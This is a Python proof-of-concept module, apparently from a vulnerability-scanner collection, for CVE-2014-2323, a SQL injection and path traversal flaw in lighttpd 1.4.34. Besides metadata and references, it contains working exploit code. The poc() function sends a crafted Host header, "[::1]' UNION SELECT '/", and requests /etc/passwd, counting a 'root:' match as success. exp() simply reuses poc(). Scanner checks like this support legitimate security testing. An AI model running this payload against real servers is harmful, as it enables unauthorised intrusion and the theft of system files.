import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Lighttpd 1.4.34 SQL Injection and Path Traversal''',
        "description": '''A SQL injection vulnerability in mod_mysql_vhost.c in lighttpd before 1.4.35 allows remote attackers to execute arbitrary SQL commands via the host name (related to request_check_hostname).''',
        "severity": "critical",
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2014-2323", 
            "https://download.lighttpd.net/lighttpd/security/lighttpd_sa_2014_01.txt", 
            "http://www.lighttpd.net/2014/3/12/1.4.35/"
        ],
        "classification": {
            "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cvss-score": "9.8",
            "cve-id": "CVE-2014-2323",
            "cwe-id": "CWE-89"
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["cve", "cve2014", "sqli", "lighttpd", "injection"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)
        path = '/etc/passwd'
        headers = {
            "Host": "[::1]' UNION SELECT '/"
        }

        resp = requests.get(url+path, headers=headers, timeout=10, verify=False, allow_redirects=False)
        if resp.status_code == 200 and "root:" in resp.text:
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url